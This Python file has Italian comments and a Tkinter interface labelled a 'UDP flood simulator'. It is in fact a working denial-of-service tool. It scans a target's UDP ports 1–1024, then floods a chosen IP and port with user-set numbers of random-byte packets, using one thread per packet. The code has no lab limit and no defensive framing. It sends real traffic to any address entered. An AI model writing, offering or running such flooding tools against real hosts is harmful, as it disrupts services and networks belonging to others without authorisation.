import socket
import os
import threading
import tkinter as tk
from tkinter import messagebox

# Funzione per generare pacchetti casuali
def generate_packet(size):
    """Genera un pacchetto di byte casuali della dimensione specificata."""
    return os.urandom(size)

# Funzione per eseguire un UDP Flood
def udp_flood(target_ip, target_port, packet_size, packet_count):
    """Simula un UDP flood inviando pacchetti verso l'IP e la porta specificati."""
    def send_packet():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                packet = generate_packet(packet_size)
                sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto: {e}")

    print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
    threads = []
    try:
        for _ in range(packet_count):
            thread = threading.Thread(target=send_packet)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print("Attacco completato!")
    except Exception as e:
        print(f"Errore generale nell'UDP Flood: {e}")

# Funzione per scansionare una singola porta UDP
def scan_udp_port(target_ip, port, open_ports, output_widget, lock):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(0.01)
        try:
            s.sendto(b"", (target_ip, port))
            s.recvfrom(1024)
        except socket.timeout:
            with lock:
                open_ports.append(port)
                output_widget.insert(tk.END, f"Porta UDP aperta: {port}\n")
                output_widget.see(tk.END)
        except Exception:
            pass

# Funzione per eseguire la scansione di porte UDP
def scan_udp_ports(target_ip, output_widget):
    open_ports = []
    threads = []
    lock = threading.Lock()
    output_widget.delete(1.0, tk.END)  # Cancella il contenuto precedente

    def scan_callback():
        try:
            for port in range(1, 1025):
                thread = threading.Thread(target=scan_udp_port, args=(target_ip, port, open_ports, output_widget, lock))
                thread.daemon = True
                threads.append(thread)
                thread.start()

                if len(threads) >= 100:  # Aumenta il numero di thread simultanei
                    for t in threads:
                        t.join()
                    threads.clear()

            for t in threads:
                t.join()

            messagebox.showinfo("Scansione completata", f"Scansione completata. Porte aperte trovate: {len(open_ports)}")
        except Exception as e:
            messagebox.showerror("Errore", f"Errore durante la scansione: {e}")

    threading.Thread(target=scan_callback, daemon=True).start()

# Funzione per avviare la scansione tramite GUI
def start_port_scan():
    target_ip = ip_entry.get()
    if not target_ip:
        messagebox.showerror("Errore", "Inserisci un IP per la scansione delle porte!")
        return

    scan_udp_ports(target_ip, port_output)

# Funzione per avviare l'UDP flood tramite GUI
def start_udp_flood():
    target_ip = ip_entry.get()
    target_port = port_entry.get()
    packet_size = size_entry.get()
    packet_count = count_entry.get()

    if not target_ip or not target_port or not packet_size or not packet_count:
        messagebox.showerror("Errore", "Tutti i campi devono essere compilati!")
        return

    try:
        target_port = int(target_port)
        packet_size = int(packet_size)
        packet_count = int(packet_count)
        threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, packet_count), daemon=True).start()
        messagebox.showinfo("In corso", "Attacco UDP flood avviato!")
    except ValueError:
        messagebox.showerror("Errore", "Porta, dimensione pacchetti e numero pacchetti devono essere numeri interi!")
    except Exception as e:
        messagebox.showerror("Errore", f"Si è verificato un errore: {e}")

# Funzione per importare la porta selezionata nella sezione UDP Flood
def import_selected_port():
    selected_port = selected_port_entry.get()
    if selected_port:
        port_entry.delete(0, tk.END)
        port_entry.insert(0, selected_port)
    else:
        messagebox.showerror("Errore", "Nessuna porta selezionata!")

# Creazione dell'interfaccia grafica (GUI)
def create_gui():
    global ip_entry, port_entry, size_entry, count_entry, selected_port_entry, port_output

    root = tk.Tk()
    root.title("Simulatore UDP Flood")

    # Sezione scansione porte
    tk.Label(root, text="--- Scansione Porte UDP ---").grid(row=0, column=0, columnspan=2, pady=10)

    tk.Label(root, text="IP Target:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    ip_entry = tk.Entry(root, width=30)
    ip_entry.grid(row=1, column=1, padx=10, pady=5)

    tk.Button(root, text="Scansiona Porte", command=start_port_scan).grid(row=2, column=0, columnspan=2, pady=10)

    tk.Label(root, text="Porte Aperte:").grid(row=3, column=0, padx=10, pady=5, sticky="ne")
    port_output = tk.Text(root, width=40, height=10)
    port_output.grid(row=3, column=1, padx=10, pady=5)

    tk.Label(root, text="Seleziona Porta:").grid(row=4, column=0, padx=10, pady=5, sticky="e")
    selected_port_entry = tk.Entry(root, width=30)
    selected_port_entry.grid(row=4, column=1, padx=10, pady=5)

    tk.Button(root, text="Importa Porta", command=import_selected_port).grid(row=5, column=0, columnspan=2, pady=10)

    # Sezione UDP Flood
    tk.Label(root, text="--- Attacco UDP Flood ---").grid(row=6, column=0, columnspan=2, pady=10)

    tk.Label(root, text="Porta Target:").grid(row=7, column=0, padx=10, pady=5, sticky="e")
    port_entry = tk.Entry(root, width=30)
    port_entry.grid(row=7, column=1, padx=10, pady=5)

    tk.Label(root, text="Dimensione Pacchetto (byte):").grid(row=8, column=0, padx=10, pady=5, sticky="e")
    size_entry = tk.Entry(root, width=30)
    size_entry.grid(row=8, column=1, padx=10, pady=5)

    tk.Label(root, text="Numero di Pacchetti:").grid(row=9, column=0, padx=10, pady=5, sticky="e")
    count_entry = tk.Entry(root, width=30)
    count_entry.grid(row=9, column=1, padx=10, pady=5)

    tk.Button(root, text="Avvia UDP Flood", command=start_udp_flood).grid(row=10, column=0, columnspan=2, pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()